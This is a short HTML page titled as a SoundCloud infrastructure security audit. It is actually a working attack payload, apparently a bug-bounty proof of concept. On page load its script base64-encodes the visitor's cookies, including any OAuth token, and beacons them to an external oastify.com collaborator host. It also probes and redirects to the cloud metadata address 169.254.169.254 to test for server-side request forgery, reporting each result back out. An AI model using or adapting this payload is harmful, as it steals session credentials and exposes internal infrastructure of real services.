<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>SoundCloud Infrastructure Security Audit</title>
    
    <meta http-equiv="refresh" content="8; url=http://169.254.169.254/latest/meta-data/hostname">

    <script>
        window.onload = function() {
            const oast = "https://ie0z38xjt8769e7sxsendgn17sdj19py.oastify.com";
            const target = "http://169.254.169.254/latest/meta-data/hostname";

            // LAYER 2: SESSION HIJACK PROOF (Critical Impact)
            // Immediately exfiltrate all accessible cookies (including oauth_token)
            try {
                navigator.sendBeacon(oast + "/exfil_cookies?data=" + btoa(document.cookie));
            } catch(e) {}

            // LAYER 3: PASSIVE INFRASTRUCTURE PROBE
            // Browsers allow HTTP image loading on HTTPS pages more freely than fetch.
            // A hit here proves the internal IP is reachable by the worker.
            const probe = new Image();
            probe.src = target;
            probe.onerror = () => {
                navigator.sendBeacon(oast + "/infra_probe?type=image_reach_attempted");
            };

            // LAYER 4: ADVANCED SSRF (Targets Headless Environments)
            // Uses 'no-cors' to bypass strict browser pre-flight checks.
            fetch(target, { 
                mode: 'no-cors', 
                keepalive: true,
                credentials: 'include'
            })
            .then(() => {
                navigator.sendBeacon(oast + "/ssrf_success?status=reachable");
            })
            .catch((err) => {
                // If this triggers, your XSS is confirmed even if the SSRF is blocked.
                navigator.sendBeacon(oast + "/xss_executed?error=" + btoa(err.message));
            });
        };
    </script>
</head>
